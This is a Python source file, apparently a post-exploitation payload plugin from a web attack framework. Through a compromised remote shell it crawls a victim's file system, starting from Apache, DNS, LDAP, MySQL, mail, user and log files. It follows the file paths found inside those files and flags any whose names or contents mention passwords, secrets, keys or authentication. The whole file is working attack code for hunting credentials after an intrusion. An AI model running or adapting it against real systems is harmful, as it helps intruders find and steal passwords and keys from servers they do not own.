import core.data.kb.knowledgeBase as kb
from core.data.constants.common_directories import get_common_directories

from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table


import re


class spider(base_payload):
    '''
    This payload crawls the remote file system and extracts information.
    '''
    def api_read(self, recursion_level):
        
        
        def extract_files_from_payloads():
            '''
            @return: A list of files that's mentioned in the other payloads
            I use this as a start point.
            '''
            payload_files =  self.exec_payload('apache_config_files')['apache_config'].keys() 
            payload_files.extend( self.exec_payload('dhcp_config_files').keys() )
            payload_files.extend( self.exec_payload('dns_config_files').keys() )
            payload_files.extend( self.exec_payload('dns_config_files').keys() )
            payload_files.extend( self.exec_payload('ftp_config_files').keys() )
            payload_files.extend( self.exec_payload('kerberos_config_files').keys() )
            payload_files.extend( self.exec_payload('ldap_config_files').keys() )
            payload_files.extend( self.exec_payload('mail_config_files').keys() )
            payload_files.extend( self.exec_payload('mysql_config').keys() )
            payload_files.extend( self.exec_payload('users_config_files').keys() )
            payload_files.extend( self.exec_payload('read_mail').keys() )
            payload_files.extend( self.exec_payload('log_reader').keys() )
            payload_files.extend( self.exec_payload('interesting_files').keys() )
            #    This increases the run time of this plugin a lot! 
            '''
            pid_info = self.exec_payload('list_processes')
            for pid in pid_info:
                filename = pid_info[pid]['cmd'].split(' ')[0]
                payload_files.append( filename )
            '''
            
            return payload_files

        def extract_files_from_file( filename, file_content ):
            '''
            @param filename: The filename to request to the remote end and parse
            @param file_content: The content of the file to analyze
            @return: A list of files referenced in "filename"
            ''' 
            # Compile 
            regular_expressions = [] 
            for common_dirs in get_common_directories(): 
                regex_string = '('+common_dirs + '.*?)[:| |\0|\'|"|<|\n|\r|\t]' 
                regex = re.compile( regex_string,  re.IGNORECASE) 
                regular_expressions.append(regex) 
             
            # And use 
            result = []
            for regex in regular_expressions: 
                result.extend( regex.findall( file_content ) ) 
             
            # uniq 
            result = list(set(result)) 

            return result 

        def is_interesting_file( filename, file_content ):
            '''
            @return: True if the file seems interesting
            '''
            keyword_list = []
            keyword_list.append('passwords')
            keyword_list.append('passwd')
            keyword_list.append('password')
            keyword_list.append('access')
            keyword_list.append('auth')
            keyword_list.append('authentication')
            keyword_list.append('authenticate')
            keyword_list.append('secret')
            keyword_list.append('key')
            keyword_list.append('keys')
            keyword_list.append('permissions')
            keyword_list.append('perm')
            
            for key in keyword_list:
                if key in filename or key in file_content:
                    return True
            else:
                return False


        self.result = {}        
        
        initial_file_list = extract_files_from_payloads()
        
        while recursion_level > 0:
            
            new_files = []
            
            for filename in initial_file_list:
                
                if filename not in self.result:
                    
                    file_content = self.shell.read( filename )
                    
                    if file_content:
                        #
                        #    Save it in the result
                        #
                        if filename not in self.result:
                            self.result[ filename ] = is_interesting_file( filename, file_content )
                        
                        #
                        #    Extract info from it
                        #
                        new_files.extend( extract_files_from_file( filename, file_content ) )
            
            #
            #    Finish one pass, lets setup the next one
            #
            recursion_level -= 1
            initial_file_list = new_files
        
        return self.result

    def run_read(self, parameters):
        
        if len(parameters) > 1:
            return 'Usage: spider <recursion levels>'
        elif len(parameters) == 1:
            recursion_level = parameters[0]
        else:
            recursion_level = 2
            
        api_result = self.api_read( recursion_level )
                
        if not api_result:
            return 'No files found.'
        else:
            rows = []
            rows.append( ['Filename','Interesting'] )
            rows.append( [] )
            for filename in api_result:
                interesting = api_result[filename] and 'X' or ''
                rows.append( [filename, interesting ] )
                    
            result_table = table( rows )
            result_table.draw( 80 )
            return
        